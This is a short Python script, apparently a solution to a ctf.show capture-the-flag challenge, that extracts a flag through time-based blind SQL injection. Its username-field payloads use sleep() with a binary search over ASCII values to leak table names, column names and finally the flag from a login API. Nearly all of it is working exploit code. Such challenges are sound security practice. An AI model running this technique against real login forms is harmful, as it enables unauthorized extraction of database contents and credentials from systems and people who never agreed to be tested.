import requests
import time

url='http://57597570-c08d-430e-a9bd-50d53773bc9d.challenge.ctf.show/api/'

flag=''
for i in range(60):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload=f"' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.02),1)#"
        #payload=f"' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag233333'),{i},1))<{j},sleep(0.02),1)#"
        payload=f"' or if(ascii(substr((select group_concat(flagass233) from flag233333),{i},1))<{j},sleep(0.02),1)#"

        data={
            'username': payload,
            'password':'1'}
        try:
            r=requests.post(url=url,data=data,timeout=0.35)
            min=j
        except:
            max=j

        time.sleep(0.3)